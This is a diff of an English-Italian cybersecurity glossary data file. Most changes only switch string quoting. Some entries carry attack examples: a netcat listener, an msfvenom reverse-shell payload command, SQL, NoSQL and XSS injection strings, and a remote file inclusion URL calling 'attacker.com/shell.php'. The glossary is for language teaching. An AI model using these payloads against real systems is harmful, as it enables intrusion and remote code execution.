@@ -28,10 +28,10 @@ export default {
               pronunciation: '/ˈeθɪkəl ˈhækɪŋ/',
               phonetic: 'E-thi-kel HAK-ing',
               example:
-                'Ethical hacking helps organizations find security flaws. = L\'hacking etico aiuta le organizzazioni a trovare falle di sicurezza.',
+                "Ethical hacking helps organizations find security flaws. = L'hacking etico aiuta le organizzazioni a trovare falle di sicurezza.",
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'L\'hacking etico è legale perché autorizzato dal proprietario del sistema.',
+              note: "L'hacking etico è legale perché autorizzato dal proprietario del sistema.",
             },
             {
               english: 'White Hat',
@@ -82,7 +82,7 @@ export default {
               pronunciation: '/skoʊp/',
               phonetic: 'SKOUP',
               example:
-                'The scope defines what systems can be tested. = L\'ambito definisce quali sistemi possono essere testati.',
+                "The scope defines what systems can be tested. = L'ambito definisce quali sistemi possono essere testati.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Mai testare sistemi fuori dallo scope: sarebbe illegale.',
@@ -114,7 +114,7 @@ export default {
               pronunciation: '/ˈtɑːrɡɪt/',
               phonetic: 'TAR-ghit',
               example:
-                'The target of the assessment was the web application. = L\'obiettivo della valutazione era l\'applicazione web.',
+                "The target of the assessment was the web application. = L'obiettivo della valutazione era l'applicazione web.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -186,7 +186,7 @@ export default {
                 'The red team simulates real-world attacks. = Il red team simula attacchi del mondo reale.',
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'Origine militare: la squadra rossa è l\'attaccante nelle esercitazioni.',
+              note: "Origine militare: la squadra rossa è l'attaccante nelle esercitazioni.",
             },
             {
               english: 'Blue Team',
@@ -215,7 +215,7 @@ export default {
               pronunciation: '/bʌɡ ˈbaʊnti/',
               phonetic: 'BAG BAUN-ti',
               example:
-                'The company offers a bug bounty program to researchers. = L\'azienda offre un programma di bug bounty ai ricercatori.',
+                "The company offers a bug bounty program to researchers. = L'azienda offre un programma di bug bounty ai ricercatori.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Le aziende pagano chi trova vulnerabilità: da centinaia a milioni di dollari.',
@@ -264,7 +264,7 @@ export default {
               pronunciation: '/əˈtæk ˈvektər/',
               phonetic: 'e-TAK VEK-ter',
               example:
-                'Email is a common attack vector for phishing. = L\'email è un vettore di attacco comune per il phishing.',
+                "Email is a common attack vector for phishing. = L'email è un vettore di attacco comune per il phishing.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -305,7 +305,7 @@ export default {
               pronunciation: '/ɪˌnjuːməˈreɪʃən/',
               phonetic: 'i-niu-me-REI-scen',
               example:
-                'Enumeration reveals usernames and network shares. = L\'enumerazione rivela nomi utente e condivisioni di rete.',
+                "Enumeration reveals usernames and network shares. = L'enumerazione rivela nomi utente e condivisioni di rete.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -315,7 +315,7 @@ export default {
               pronunciation: '/ˈfʊtprɪntɪŋ/',
               phonetic: 'FUT-prin-ting',
               example:
-                'Footprinting gathers information about the target organization. = Il footprinting raccoglie informazioni sull\'organizzazione bersaglio.',
+                "Footprinting gathers information about the target organization. = Il footprinting raccoglie informazioni sull'organizzazione bersaglio.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -325,7 +325,7 @@ export default {
               pronunciation: '/ˈpeɪloʊd/',
               phonetic: 'PEI-loud',
               example:
-                'The payload executes after the exploit succeeds. = Il payload viene eseguito dopo che l\'exploit ha successo.',
+                "The payload executes after the exploit succeeds. = Il payload viene eseguito dopo che l'exploit ha successo.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Termine militare: il "carico" che viene consegnato dall\'exploit.',
@@ -336,7 +336,7 @@ export default {
               pronunciation: '/ˈbækdɔːr/',
               phonetic: 'BAK-door',
               example:
-                'The attacker installed a backdoor for persistent access. = L\'attaccante ha installato una backdoor per accesso persistente.',
+                "The attacker installed a backdoor for persistent access. = L'attaccante ha installato una backdoor per accesso persistente.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -364,7 +364,7 @@ export default {
               pronunciation: '/nɒn dɪsˈkloʊʒər əˈɡriːmənt/',
               phonetic: 'NON dis-KLOU-zher e-GRII-ment',
               example:
-                'Sign the non-disclosure agreement before the engagement. = Firma l\'accordo di non divulgazione prima dell\'incarico.',
+                "Sign the non-disclosure agreement before the engagement. = Firma l'accordo di non divulgazione prima dell'incarico.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Abbreviato NDA. Protegge le informazioni sensibili scoperte durante il test.',
@@ -426,8 +426,7 @@ export default {
               italian: 'Incarico / Ingaggio',
               pronunciation: '/ɪnˈɡeɪdʒmənt/',
               phonetic: 'in-GEIG-ment',
-              example:
-                'The engagement lasted two weeks. = L\'incarico è durato due settimane.',
+              example: "The engagement lasted two weeks. = L'incarico è durato due settimane.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Nel contesto del pentesting, indica il progetto di test nel suo complesso.',
@@ -487,7 +486,7 @@ export default {
                 'The cyber kill chain describes seven attack phases. = La catena di attacco informatico descrive sette fasi di attacco.',
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'Modello Lockheed Martin: 7 fasi dall\'attacco alla compromissione.',
+              note: "Modello Lockheed Martin: 7 fasi dall'attacco alla compromissione.",
             },
             {
               english: 'Weaponization',
@@ -495,7 +494,7 @@ export default {
               pronunciation: '/ˌwepənaɪˈzeɪʃən/',
               phonetic: 'ue-pe-nai-ZEI-scen',
               example:
-                'Weaponization involves coupling an exploit with a payload. = L\'armamento implica accoppiare un exploit con un payload.',
+                "Weaponization involves coupling an exploit with a payload. = L'armamento implica accoppiare un exploit con un payload.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -505,7 +504,7 @@ export default {
               pronunciation: '/dɪˈlɪvəri/',
               phonetic: 'di-LI-ve-ri',
               example:
-                'The delivery phase transmits the weapon to the target. = La fase di consegna trasmette l\'arma al bersaglio.',
+                "The delivery phase transmits the weapon to the target. = La fase di consegna trasmette l'arma al bersaglio.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -515,7 +514,7 @@ export default {
               pronunciation: '/ˌɪnstəˈleɪʃən/',
               phonetic: 'in-ste-LEI-scen',
               example:
-                'Installation establishes persistence on the compromised system. = L\'installazione stabilisce la persistenza sul sistema compromesso.',
+                "Installation establishes persistence on the compromised system. = L'installazione stabilisce la persistenza sul sistema compromesso.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -528,7 +527,7 @@ export default {
                 'The command and control server manages the compromised hosts. = Il server di comando e controllo gestisce gli host compromessi.',
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'Abbreviato C2 o C&C. Il canale con cui l\'attaccante controlla il malware.',
+              note: "Abbreviato C2 o C&C. Il canale con cui l'attaccante controlla il malware.",
             },
             {
               english: 'Actions on Objectives',
@@ -556,7 +555,7 @@ export default {
               pronunciation: '/pərˈsɪstəns/',
               phonetic: 'per-SIS-tens',
               example:
-                'The attacker established persistence via a scheduled task. = L\'attaccante ha stabilito la persistenza tramite un\'attività pianificata.',
+                "The attacker established persistence via a scheduled task. = L'attaccante ha stabilito la persistenza tramite un'attività pianificata.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -566,7 +565,7 @@ export default {
               pronunciation: '/ˌeksfɪlˈtreɪʃən/',
               phonetic: 'eks-fil-TREI-scen',
               example:
-                'Data exfiltration was detected by the monitoring system. = L\'esfiltrazione di dati è stata rilevata dal sistema di monitoraggio.',
+                "Data exfiltration was detected by the monitoring system. = L'esfiltrazione di dati è stata rilevata dal sistema di monitoraggio.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -647,7 +646,7 @@ export default {
               pronunciation: '/ˈtæktɪk/',
               phonetic: 'TAK-tik',
               example:
-                'Each tactic in ATT&CK represents an adversary goal. = Ogni tattica in ATT&CK rappresenta un obiettivo dell\'avversario.',
+                "Each tactic in ATT&CK represents an adversary goal. = Ogni tattica in ATT&CK rappresenta un obiettivo dell'avversario.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -667,7 +666,7 @@ export default {
               pronunciation: '/prəˈsiːdʒər/',
               phonetic: 'pre-SII-ger',
               example:
-                'The procedure details the specific implementation of the technique. = La procedura dettaglia l\'implementazione specifica della tecnica.',
+                "The procedure details the specific implementation of the technique. = La procedura dettaglia l'implementazione specifica della tecnica.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -724,7 +723,7 @@ export default {
               pronunciation: '/ˌvʌlnərəˈbɪləti əˈnæləsɪs/',
               phonetic: 'val-ne-re-BI-li-ti e-NA-li-sis',
               example:
-                'Vulnerability analysis correlates scan results with known exploits. = L\'analisi delle vulnerabilità correla i risultati di scansione con exploit noti.',
+                "Vulnerability analysis correlates scan results with known exploits. = L'analisi delle vulnerabilità correla i risultati di scansione con exploit noti.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -734,7 +733,7 @@ export default {
               pronunciation: '/poʊst ˌeksplɔɪˈteɪʃən/',
               phonetic: 'POUST eks-ploi-TEI-scen',
               example:
-                'Post-exploitation determines the real impact of a breach. = Il post-sfruttamento determina l\'impatto reale di una violazione.',
+                "Post-exploitation determines the real impact of a breach. = Il post-sfruttamento determina l'impatto reale di una violazione.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -770,11 +769,11 @@ export default {
             },
             {
               english: 'Scoping',
-              italian: 'Definizione dell\'ambito',
+              italian: "Definizione dell'ambito",
               pronunciation: '/ˈskoʊpɪŋ/',
               phonetic: 'SKOU-ping',
               example:
-                'Scoping determines which assets will be tested. = La definizione dell\'ambito determina quali asset saranno testati.',
+                "Scoping determines which assets will be tested. = La definizione dell'ambito determina quali asset saranno testati.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -811,7 +810,7 @@ export default {
               pronunciation: '/θret ˈæktər/',
               phonetic: 'THRET AK-ter',
               example:
-                'The threat actor was identified as a nation-state group. = L\'attore della minaccia è stato identificato come un gruppo statale.',
+                "The threat actor was identified as a nation-state group. = L'attore della minaccia è stato identificato come un gruppo statale.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -843,7 +842,7 @@ export default {
               pronunciation: '/ˈhæktɪvɪst/',
               phonetic: 'HAK-ti-vist',
               example:
-                'The hacktivist defaced the government website. = L\'hacktivista ha defacciato il sito governativo.',
+                "The hacktivist defaced the government website. = L'hacktivista ha defacciato il sito governativo.",
               context: 'methodology',
               difficulty: 'beginner',
               note: 'Hacker + attivista: motivato da cause politiche o sociali.',
@@ -854,7 +853,7 @@ export default {
               pronunciation: '/ɪnˈsaɪdər θret/',
               phonetic: 'in-SAI-der THRET',
               example:
-                'An insider threat comes from within the organization. = Una minaccia interna proviene dall\'interno dell\'organizzazione.',
+                "An insider threat comes from within the organization. = Una minaccia interna proviene dall'interno dell'organizzazione.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -875,7 +874,7 @@ export default {
               pronunciation: '/səˈplaɪ tʃeɪn əˈtæk/',
               phonetic: 'se-PLAI CEIN e-TAK',
               example:
-                'The supply chain attack compromised a software update. = L\'attacco alla catena di fornitura ha compromesso un aggiornamento software.',
+                "The supply chain attack compromised a software update. = L'attacco alla catena di fornitura ha compromesso un aggiornamento software.",
               context: 'methodology',
               difficulty: 'beginner',
             },
@@ -888,7 +887,7 @@ export default {
                 'A watering hole attack infects websites visited by the target. = Un attacco watering hole infetta siti web visitati dal bersaglio.',
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'Come un predatore che aspetta la preda all\'abbeveratoio.',
+              note: "Come un predatore che aspetta la preda all'abbeveratoio.",
             },
             {
               english: 'Drive-by Download',
@@ -909,7 +908,7 @@ export default {
                 'Living off the land uses built-in system tools to avoid detection. = Vivere del territorio usa strumenti di sistema integrati per evitare il rilevamento.',
               context: 'methodology',
               difficulty: 'beginner',
-              note: 'Abbreviato LotL. L\'attaccante usa PowerShell, WMI, ecc. invece di malware esterno.',
+              note: "Abbreviato LotL. L'attaccante usa PowerShell, WMI, ecc. invece di malware esterno.",
             },
           ],
         },
@@ -933,7 +932,7 @@ export default {
               pronunciation: '/ˈoʊsɪnt/',
               phonetic: 'OU-sint',
               example:
-                'OSINT leverages publicly available information. = L\'OSINT sfrutta informazioni disponibili pubblicamente.',
+                "OSINT leverages publicly available information. = L'OSINT sfrutta informazioni disponibili pubblicamente.",
               context: 'reconnaissance',
               difficulty: 'beginner',
               note: 'Open Source Intelligence: informazioni raccolte da fonti pubbliche.',
@@ -975,10 +974,10 @@ export default {
               pronunciation: '/ˈsoʊʃəl ˈmiːdiə ɪnˈtelɪdʒəns/',
               phonetic: 'SOU-shel MII-dia in-TE-li-gens',
               example:
-                'Social media intelligence reveals employee information. = L\'intelligence dai social media rivela informazioni sui dipendenti.',
+                "Social media intelligence reveals employee information. = L'intelligence dai social media rivela informazioni sui dipendenti.",
               context: 'reconnaissance',
               difficulty: 'beginner',
-              note: 'Abbreviato SOCMINT. LinkedIn è una miniera d\'oro per i pentester.',
+              note: "Abbreviato SOCMINT. LinkedIn è una miniera d'oro per i pentester.",
             },
             {
               english: 'Metadata',
@@ -1027,7 +1026,7 @@ export default {
               pronunciation: '/ˈdɪdʒɪtəl ˈfʊtprɪnt/',
               phonetic: 'DI-gi-tel FUT-print',
               example:
-                'Everyone leaves a digital footprint online. = Tutti lasciano un\'impronta digitale online.',
+                "Everyone leaves a digital footprint online. = Tutti lasciano un'impronta digitale online.",
               context: 'reconnaissance',
               difficulty: 'beginner',
             },
@@ -1271,7 +1270,7 @@ export default {
               pronunciation: '/aɪ piː reɪndʒ/',
               phonetic: 'AI-PII REINDG',
               example:
-                'Identifying the IP range reveals all addresses belonging to the target. = Identificare l\'intervallo IP rivela tutti gli indirizzi appartenenti al bersaglio.',
+                "Identifying the IP range reveals all addresses belonging to the target. = Identificare l'intervallo IP rivela tutti gli indirizzi appartenenti al bersaglio.",
               context: 'reconnaissance',
               difficulty: 'beginner',
             },
@@ -1281,10 +1280,10 @@ export default {
               pronunciation: '/eɪ es en/',
               phonetic: 'EI-ES-EN',
               example:
-                'The ASN identifies the organization\'s network block. = L\'ASN identifica il blocco di rete dell\'organizzazione.',
+                "The ASN identifies the organization's network block. = L'ASN identifica il blocco di rete dell'organizzazione.",
               context: 'reconnaissance',
               difficulty: 'beginner',
-              note: 'Autonomous System Number: identifica un\'intera rete gestita da un\'organizzazione.',
+              note: "Autonomous System Number: identifica un'intera rete gestita da un'organizzazione.",
             },
             {
               english: 'BGP',
@@ -1302,7 +1301,7 @@ export default {
               pronunciation: '/ˈnetblɒk/',
               phonetic: 'NET-blok',
               example:
-                'The company owns a large netblock of public IP addresses. = L\'azienda possiede un grande blocco di rete di indirizzi IP pubblici.',
+                "The company owns a large netblock of public IP addresses. = L'azienda possiede un grande blocco di rete di indirizzi IP pubblici.",
               context: 'reconnaissance',
               difficulty: 'beginner',
             },
@@ -1400,7 +1399,7 @@ export default {
               pronunciation: '/sɪn skæn/',
               phonetic: 'SIN SKAN',
               example:
-                'A SYN scan is stealthier because it does not complete the handshake. = Una scansione SYN è più furtiva perché non completa l\'handshake.',
+                "A SYN scan is stealthier because it does not complete the handshake. = Una scansione SYN è più furtiva perché non completa l'handshake.",
               context: 'scanning',
               difficulty: 'beginner',
               command: 'nmap -sS target',
@@ -1514,7 +1513,7 @@ export default {
               pronunciation: '/es em biː ɪˌnjuːməˈreɪʃən/',
               phonetic: 'ES-EM-BII i-niu-me-REI-scen',
               example:
-                'SMB enumeration lists shared folders and users on Windows. = L\'enumerazione SMB elenca le cartelle condivise e gli utenti su Windows.',
+                "SMB enumeration lists shared folders and users on Windows. = L'enumerazione SMB elenca le cartelle condivise e gli utenti su Windows.",
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'enum4linux, smbclient',
@@ -1525,7 +1524,7 @@ export default {
               pronunciation: '/es en em piː ɪˌnjuːməˈreɪʃən/',
               phonetic: 'ES-EN-EM-PII i-niu-me-REI-scen',
               example:
-                'SNMP enumeration extracts system information from network devices. = L\'enumerazione SNMP estrae informazioni di sistema dai dispositivi di rete.',
+                "SNMP enumeration extracts system information from network devices. = L'enumerazione SNMP estrae informazioni di sistema dai dispositivi di rete.",
               context: 'scanning',
               difficulty: 'beginner',
               command: 'snmpwalk -v2c -c public target',
@@ -1536,7 +1535,7 @@ export default {
               pronunciation: '/el diː eɪ piː ɪˌnjuːməˈreɪʃən/',
               phonetic: 'EL-DII-EI-PII i-niu-me-REI-scen',
               example:
-                'LDAP enumeration retrieves user and group information from Active Directory. = L\'enumerazione LDAP recupera informazioni su utenti e gruppi da Active Directory.',
+                "LDAP enumeration retrieves user and group information from Active Directory. = L'enumerazione LDAP recupera informazioni su utenti e gruppi da Active Directory.",
               context: 'scanning',
               difficulty: 'beginner',
             },
@@ -1546,7 +1545,7 @@ export default {
               pronunciation: '/diː en es ɪˌnjuːməˈreɪʃən/',
               phonetic: 'DII-EN-ES i-niu-me-REI-scen',
               example:
-                'DNS enumeration discovers subdomains and mail servers. = L\'enumerazione DNS scopre sottodomini e server di posta.',
+                "DNS enumeration discovers subdomains and mail servers. = L'enumerazione DNS scopre sottodomini e server di posta.",
               context: 'scanning',
               difficulty: 'beginner',
               tool: 'dnsenum, dnsrecon',
@@ -1557,7 +1556,7 @@ export default {
               pronunciation: '/en ef es ɪˌnjuːməˈreɪʃən/',
               phonetic: 'EN-EF-ES i-niu-me-REI-scen',
               example:
-                'NFS enumeration reveals exported file systems. = L\'enumerazione NFS rivela i file system esportati.',
+                "NFS enumeration reveals exported file systems. = L'enumerazione NFS rivela i file system esportati.",
               context: 'scanning',
               difficulty: 'beginner',
               command: 'showmount -e target',
@@ -1568,7 +1567,7 @@ export default {
               pronunciation: '/ɑːr piː siː ɪˌnjuːməˈreɪʃən/',
               phonetic: 'AR-PII-SII i-niu-me-REI-scen',
               example:
-                'RPC enumeration maps available remote procedures. = L\'enumerazione RPC mappa le procedure remote disponibili.',
+                "RPC enumeration maps available remote procedures. = L'enumerazione RPC mappa le procedure remote disponibili.",
               context: 'scanning',
               difficulty: 'beginner',
               command: 'rpcclient -U "" target',
@@ -1768,7 +1767,7 @@ export default {
               pronunciation: '/ˈvɜːrtʃuəl hoʊst/',
               phonetic: 'VER-ciual HOUST',
               example:
-                'Virtual host enumeration finds multiple websites on one IP. = L\'enumerazione degli host virtuali trova più siti web su un IP.',
+                "Virtual host enumeration finds multiple websites on one IP. = L'enumerazione degli host virtuali trova più siti web su un IP.",
               context: 'scanning',
               difficulty: 'beginner',
             },
@@ -1883,7 +1882,7 @@ export default {
               pronunciation: '/ˈoʊpən væs/',
               phonetic: 'OU-pen VAS',
               example:
-                'OpenVAS is a free alternative to Nessus. = OpenVAS è un\'alternativa gratuita a Nessus.',
+                "OpenVAS is a free alternative to Nessus. = OpenVAS è un'alternativa gratuita a Nessus.",
               context: 'vuln-scanning',
               difficulty: 'intermediate',
               tool: 'Greenbone OpenVAS',
@@ -2021,7 +2020,7 @@ export default {
               pronunciation: '/əˈtæk kəmˈpleksəti/',
               phonetic: 'e-TAK kem-PLEK-si-ti',
               example:
-                'Low attack complexity means the exploit works reliably. = Bassa complessità di attacco significa che l\'exploit funziona in modo affidabile.',
+                "Low attack complexity means the exploit works reliably. = Bassa complessità di attacco significa che l'exploit funziona in modo affidabile.",
               context: 'vuln-scanning',
               difficulty: 'intermediate',
             },
@@ -2051,7 +2050,7 @@ export default {
               pronunciation: '/siː aɪ eɪ ˈɪmpækt/',
               phonetic: 'SII-AI-EI IM-pakt',
               example:
-                'CIA impact measures effects on Confidentiality, Integrity, and Availability. = L\'impatto CIA misura gli effetti su Riservatezza, Integrità e Disponibilità.',
+                "CIA impact measures effects on Confidentiality, Integrity, and Availability. = L'impatto CIA misura gli effetti su Riservatezza, Integrità e Disponibilità.",
               context: 'vuln-scanning',
               difficulty: 'intermediate',
             },
@@ -2101,7 +2100,7 @@ export default {
               pronunciation: '/ˈeksplɔɪt ˈdeɪtəbeɪs/',
               phonetic: 'EKS-ploit DEI-ta-beis',
               example:
-                'Exploit-DB hosts ready-to-use proof of concept code. = Exploit-DB ospita codice proof of concept pronto all\'uso.',
+                "Exploit-DB hosts ready-to-use proof of concept code. = Exploit-DB ospita codice proof of concept pronto all'uso.",
               context: 'vuln-scanning',
               difficulty: 'intermediate',
               tool: 'exploit-db.com',
@@ -2358,7 +2357,7 @@ export default {
               pronunciation: '/ˈpeɪloʊd/',
               phonetic: 'PEI-loud',
               example:
-                'The payload runs after the exploit succeeds. = Il payload viene eseguito dopo il successo dell\'exploit.',
+                "The payload runs after the exploit succeeds. = Il payload viene eseguito dopo il successo dell'exploit.",
               context: 'exploitation',
               difficulty: 'intermediate',
               note: 'Exploit = serratura aperta; payload = quello che metti dentro.',
@@ -2369,12 +2368,12 @@ export default {
               pronunciation: '/rɪˈvɜːrs ʃel/',
               phonetic: 'ri-VERS SHEL',
               example:
-                'A reverse shell connects back from the victim to the attacker. = Una shell inversa si connette dalla vittima all\'attaccante.',
+                "A reverse shell connects back from the victim to the attacker. = Una shell inversa si connette dalla vittima all'attaccante.",
               context: 'exploitation',
               difficulty: 'intermediate',
               tool: 'msfvenom, netcat',
               command: 'nc -lvnp 4444',
-              note: 'Bypassa firewall in entrata: la vittima inizia la connessione verso l\'attaccante.',
+              note: "Bypassa firewall in entrata: la vittima inizia la connessione verso l'attaccante.",
             },
             {
               english: 'Bind Shell',
@@ -2432,7 +2431,8 @@ export default {
               context: 'exploitation',
               difficulty: 'intermediate',
               tool: 'Metasploit',
-              command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe',
+              command:
+                'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe',
             },
           ],
         },
@@ -2458,17 +2458,17 @@ export default {
               pronunciation: '/stæk ˈoʊvərfloʊ/',
               phonetic: 'STAK OU-ver-flou',
               example:
-                'A stack overflow can overwrite the return address. = Un overflow dello stack può sovrascrivere l\'indirizzo di ritorno.',
+                "A stack overflow can overwrite the return address. = Un overflow dello stack può sovrascrivere l'indirizzo di ritorno.",
               context: 'exploitation',
               difficulty: 'intermediate',
             },
             {
               english: 'Heap Overflow',
-              italian: 'Overflow dell\'heap',
+              italian: "Overflow dell'heap",
               pronunciation: '/hiːp ˈoʊvərfloʊ/',
               phonetic: 'HIIP OU-ver-flou',
               example:
-                'Heap overflows are harder to exploit than stack overflows. = Gli overflow dell\'heap sono più difficili da sfruttare di quelli dello stack.',
+                "Heap overflows are harder to exploit than stack overflows. = Gli overflow dell'heap sono più difficili da sfruttare di quelli dello stack.",
               context: 'exploitation',
               difficulty: 'intermediate',
             },
@@ -2502,7 +2502,7 @@ export default {
               pronunciation: '/rɪˈtɜːrn əˈdres/',
               phonetic: 'ri-TERN e-DRES',
               example:
-                'Overwriting the return address redirects program execution. = Sovrascrivere l\'indirizzo di ritorno reindirizza l\'esecuzione del programma.',
+                "Overwriting the return address redirects program execution. = Sovrascrivere l'indirizzo di ritorno reindirizza l'esecuzione del programma.",
               context: 'exploitation',
               difficulty: 'intermediate',
             },
@@ -2512,7 +2512,7 @@ export default {
               pronunciation: '/iː aɪ piː/',
               phonetic: 'II-AI-PII',
               example:
-                'Controlling EIP means controlling code execution on x86. = Controllare EIP significa controllare l\'esecuzione del codice su x86.',
+                "Controlling EIP means controlling code execution on x86. = Controllare EIP significa controllare l'esecuzione del codice su x86.",
               context: 'exploitation',
               difficulty: 'intermediate',
               note: 'Extended Instruction Pointer: punta alla prossima istruzione su x86 (32-bit). Su x64 si chiama RIP.',
@@ -2533,8 +2533,7 @@ export default {
               italian: 'ESP / Puntatore allo stack esteso',
               pronunciation: '/iː es piː/',
               phonetic: 'II-ES-PII',
-              example:
-                'ESP points to the top of the stack. = ESP punta alla cima dello stack.',
+              example: 'ESP points to the top of the stack. = ESP punta alla cima dello stack.',
               context: 'exploitation',
               difficulty: 'intermediate',
             },
@@ -2583,7 +2582,7 @@ export default {
               pronunciation: '/ˈpætərn kriˈeɪt/',
               phonetic: 'PA-tern kri-EIT',
               example:
-                'Pattern create generates a unique string for offset discovery. = Pattern create genera una stringa unica per trovare l\'offset.',
+                "Pattern create generates a unique string for offset discovery. = Pattern create genera una stringa unica per trovare l'offset.",
               context: 'exploitation',
               difficulty: 'intermediate',
               tool: 'Metasploit',
@@ -2618,7 +2617,7 @@ export default {
               pronunciation: '/dʒʌmp iː es piː/',
               phonetic: 'GIAMP-II-ES-PII',
               example:
-                'A JMP ESP gadget redirects execution to the shellcode on the stack. = Un gadget JMP ESP reindirizza l\'esecuzione allo shellcode sullo stack.',
+                "A JMP ESP gadget redirects execution to the shellcode on the stack. = Un gadget JMP ESP reindirizza l'esecuzione allo shellcode sullo stack.",
               context: 'exploitation',
               difficulty: 'intermediate',
               code: 'jmp esp',
@@ -2694,7 +2693,7 @@ export default {
               pronunciation: '/diː iː piː/',
               phonetic: 'DII-II-PII',
               example:
-                'DEP prevents execution of code in data sections. = DEP impedisce l\'esecuzione di codice nelle sezioni dati.',
+                "DEP prevents execution of code in data sections. = DEP impedisce l'esecuzione di codice nelle sezioni dati.",
               context: 'exploitation',
               difficulty: 'intermediate',
               note: 'Data Execution Prevention. Su Linux si chiama NX bit. Blocca shellcode classico nello stack.',
@@ -2718,7 +2717,7 @@ export default {
                 'A stack canary detects buffer overflows before return. = Un canarino dello stack rileva i buffer overflow prima del ritorno.',
               context: 'exploitation',
               difficulty: 'intermediate',
-              note: 'Valore casuale messo prima dell\'indirizzo di ritorno: se cambia, il programma termina.',
+              note: "Valore casuale messo prima dell'indirizzo di ritorno: se cambia, il programma termina.",
             },
             {
               english: 'CFI',
@@ -2737,7 +2736,7 @@ export default {
               pronunciation: '/piː aɪ iː/',
               phonetic: 'PII-AI-II',
               example:
-                'PIE makes the executable itself address-randomized. = PIE rende l\'eseguibile stesso randomizzato in memoria.',
+                "PIE makes the executable itself address-randomized. = PIE rende l'eseguibile stesso randomizzato in memoria.",
               context: 'exploitation',
               difficulty: 'intermediate',
               command: 'gcc -pie -fPIE prog.c',
@@ -2808,7 +2807,7 @@ export default {
               pronunciation: '/es kjuː el ɪnˈdʒekʃən/',
               phonetic: 'ES-KIU-EL in-GIEK-scen',
               example:
-                'SQL injection allows arbitrary database queries. = L\'iniezione SQL permette query arbitrarie sul database.',
+                "SQL injection allows arbitrary database queries. = L'iniezione SQL permette query arbitrarie sul database.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'sqlmap',
@@ -2832,7 +2831,7 @@ export default {
               pronunciation: '/ˈjuːnjən beɪst es kjuː el aɪ/',
               phonetic: 'IU-nion BEIST ES-KIU-EL-AI',
               example:
-                'UNION-based SQLi appends results from another table. = La SQLi basata su UNION appende risultati da un\'altra tabella.',
+                "UNION-based SQLi appends results from another table. = La SQLi basata su UNION appende risultati da un'altra tabella.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: "' UNION SELECT username, password FROM users-- -",
@@ -2847,7 +2846,7 @@ export default {
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'sqlmap',
-              note: 'L\'app non mostra dati ma cambia comportamento in base al risultato della query.',
+              note: "L'app non mostra dati ma cambia comportamento in base al risultato della query.",
             },
             {
               english: 'Boolean-Based Blind SQLi',
@@ -2877,7 +2876,7 @@ export default {
               pronunciation: '/es kjuː el mæp/',
               phonetic: 'ES-KIU-EL-MAP',
               example:
-                'sqlmap automates the entire SQL injection exploitation process. = sqlmap automatizza l\'intero processo di sfruttamento di SQL injection.',
+                "sqlmap automates the entire SQL injection exploitation process. = sqlmap automatizza l'intero processo di sfruttamento di SQL injection.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'sqlmap',
@@ -2900,7 +2899,7 @@ export default {
               pronunciation: '/noʊ es kjuː el ɪnˈdʒekʃən/',
               phonetic: 'NOU-ES-KIU-EL in-GIEK-scen',
               example:
-                'NoSQL injection targets MongoDB and similar databases. = L\'iniezione NoSQL colpisce MongoDB e database simili.',
+                "NoSQL injection targets MongoDB and similar databases. = L'iniezione NoSQL colpisce MongoDB e database simili.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '{"username": {"$ne": null}, "password": {"$ne": null}}',
@@ -2956,7 +2955,7 @@ export default {
                 'Stored XSS persists in the database and affects all visitors. = La XSS persistente rimane nel database e colpisce tutti i visitatori.',
               context: 'web-hacking',
               difficulty: 'intermediate',
-              note: 'Più pericolosa della riflessa: l\'attacco si autoalimenta a ogni visita.',
+              note: "Più pericolosa della riflessa: l'attacco si autoalimenta a ogni visita.",
             },
             {
               english: 'DOM XSS',
@@ -2975,8 +2974,7 @@ export default {
               italian: 'Payload XSS',
               pronunciation: '/eks es es ˈpeɪloʊd/',
               phonetic: 'EKS-ES-ES PEI-loud',
-              example:
-                'A simple XSS payload is alert one. = Un semplice payload XSS è alert uno.',
+              example: 'A simple XSS payload is alert one. = Un semplice payload XSS è alert uno.',
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '<img src=x onerror=alert(1)>',
@@ -3104,7 +3102,7 @@ export default {
               pronunciation: '/rɪˈmoʊt faɪl ɪnˈkluːʒən/',
               phonetic: 'ri-MOUT FAIL in-KLU-zhen',
               example:
-                'Remote File Inclusion executes code from an attacker URL. = RFI esegue codice da un URL dell\'attaccante.',
+                "Remote File Inclusion executes code from an attacker URL. = RFI esegue codice da un URL dell'attaccante.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '?file=http://attacker.com/shell.php',
@@ -3116,7 +3114,7 @@ export default {
               pronunciation: '/nʌl baɪt ɪnˈdʒekʃən/',
               phonetic: 'NAL BAIT in-GIEK-scen',
               example:
